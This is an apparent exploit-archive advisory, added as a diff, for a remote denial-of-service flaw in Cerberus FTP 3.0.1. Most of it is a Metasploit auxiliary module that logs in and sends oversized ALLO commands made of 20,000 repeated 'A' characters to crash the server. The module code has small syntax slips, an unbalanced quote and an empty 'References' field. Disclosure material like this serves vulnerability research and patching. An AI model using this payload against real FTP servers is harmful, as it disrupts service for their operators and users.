@@ -1,0 +1,93 @@
+#####################################################################################
+
+Application:  Cerberus FTP 3.0.1
+            
+Platforms:    Windows XP Professional SP2
+
+crash:	      N/A
+	
+Exploitation: remote DoS
+
+Date:         2009-08-24
+
+Author:       Francis Provencher (Protek Research Lab's)
+             
+
+#####################################################################################
+
+1) Introduction
+2) Technical details
+3) The Code
+
+
+#####################################################################################
+
+===============
+1) Introduction
+
+===============
+Cerberus FTP Server is a secure and easy-to-use professional Windows FTP server featuring FIPS 140-2 certified encryption.
+
+#####################################################################################
+
+============================
+2) Technical details 
+============================
+
+The validation of some ftp commands are not made by the server. This lead to a a DoS.... 
+
+
+
+#####################################################################################
+
+===========
+3) The Code
+===========
+
+Proof of concept DoS code;
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::Ftp
+	include Msf::Auxiliary::Dos
+	
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'Cerberus FTP command ALLO overflow',
+			'Description'    => %q{
+				 You need to have a valid login
+				so you can run ALLO command.
+			},
+			'Author'         => 'Francis Provencher "Protek Research Lab's",
+			'License'        => MSF_LICENSE,
+			'Version'        => '1',
+			'References'     =>
+				
+			'DisclosureDate' => 'Aug 24 2009'))
+
+		# They're required
+		register_options([
+			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
+			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
+		])
+	end
+
+	def run
+		return unless connect_login
+
+		print_status("Sending commands...")
+
+		# We want to try to wait for responses to these
+		raw_send("ALLO #{'A' * 20000}\r\n")
+		raw_send("ALLO #{'A' * 20000}\r\n")
+
+		disconnect
+	end
+end
+
+
+#####################################################################################
+
+# milw0rm.com [2009-08-25]
